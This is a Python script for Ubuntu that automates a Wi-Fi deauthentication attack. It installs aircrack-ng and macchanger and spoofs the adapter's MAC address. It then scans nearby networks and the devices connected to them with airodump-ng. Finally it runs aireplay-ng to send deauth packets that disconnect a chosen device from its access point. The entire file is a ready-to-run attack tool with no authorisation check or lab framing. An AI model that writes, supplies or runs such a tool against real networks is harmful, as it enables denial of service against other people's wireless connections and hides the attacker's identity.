# This script allows users to disconnect a particular device from a Wi-Fi network
import subprocess
import time
import pandas
import signal

"""
This script only runs on Ubuntu. To function correctly, it requires the following tools:

  python3, pandas, time, os, signal, net-tools, macchanger, aircrack-ng

Ensure a wireless adapter is connected and properly configured in monitor mode before running.
"""

# Install necessary tools
def install_tools():
    try:
        print("Updating package list and installing required tools...")
        subprocess.run(["sudo", "apt", "update"])
        subprocess.run(["sudo", "apt", "install", "-y", "macchanger", "aircrack-ng", "net-tools"])
        print("Tools installed successfully.\n")
    except:
        print("Error: Could not install the required tools.\n")

install_tools()

# Check if adapter is connected
def check_adapter():
    try:
        print("Checking for connected wireless adapters...")
        result = subprocess.check_output(["iw", "dev"]).decode('utf-8').splitlines()
        for line in result:
            line = line.strip()
            if line.startswith("Interface"):
                interface_name = line.split()
                return interface_name[1]
    except:
        print("Error: No wireless adapter detected.\n")

Adapter = check_adapter()
print(f"Wireless adapter detected: {Adapter}\n")

# Change MAC address
def change_macaddress(Adapter):
    try:
        print(f"Changing MAC address of adapter {Adapter}...")
        subprocess.run(["sudo", "ip", "link", "set", Adapter, "down"])
        subprocess.run(["sudo", "macchanger", "-m", "00:11:22:33:44:55", Adapter])
        subprocess.run(["sudo", "ip", "link", "set", Adapter, "up"])
        print(f"MAC address for {Adapter} set to 00:11:22:33:44:55\n")
    except subprocess.CalledProcessError:
        print("Error: Unable to change MAC address.\n")
    except Exception:
        print("Unexpected error occurred while changing MAC address.\n")

change_macaddress(Adapter)

# Run airodump-ng to scan for networks
def get_targets():
    try:
        Data = "Data"
        print("Scanning for nearby networks (20 seconds)...")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "--write", Data, "--output-format", "csv", Adapter],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(20)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print("Network scan complete.\n")
        return Data + "-01.csv"
    except Exception as e:
        print(f"Error during scanning: {e}\n")
        return None

# Read scanned network data
def choose_target(path):
    try:
        print("Available networks detected:")
        target = pandas.read_csv(path)
        print(target)
    except Exception as e:
        print(f"Unable to read target data: {e}\n")

data_path = get_targets()
choose_target(data_path)

# Focus scan on selected target network
def target_mac_ch():
    try:
        print("Review the CSV file above to identify target details.")
        mac = input("Enter target BSSID (MAC address): ")
        channel = input("Enter target channel: ")
        data = "targets_devices"
        print("Scanning selected target network (20 seconds)...")
        roc = subprocess.Popen(
            ["sudo", "airodump-ng", "--bssid", mac, "--channel", channel, "--write", data, "--output-format", "csv", Adapter],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(20)
        roc.send_signal(signal.SIGINT)
        roc.wait()
        print("Target network scan complete.\n")
        return data + "-01.csv"
    except Exception as e:
        print(f"Error during target scan: {e}\n")
        return None

# Show devices connected to the target network
def target_device(path):
    try:
        print("Devices connected to the target network:")
        target = pandas.read_csv(path)
        print(target)
    except:
        print("Error: Could not read connected devices data.\n")

data_path2 = target_mac_ch()
target_device(data_path2)

# Send deauthentication attack
def send_attack():
    try:
        print("Review the device list above to identify MAC addresses.")
        target_mac = input("Enter BSSID (target AP MAC): ")
        device_mac = input("Enter device MAC address to disconnect: ")
        number_of_attack = input("Enter number of deauth packets to send: ")
        print("Launching deauthentication attack. Press Ctrl+Z to stop.")
        for num in range(20):
            print(f"Sending attack in {num}...")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", number_of_attack, "-a", target_mac, "-c", device_mac, "-D", Adapter])
        print("Attack completed.\n")
    except Exception as e:
        print(f"Error during attack: {e}\n")

send_attack()
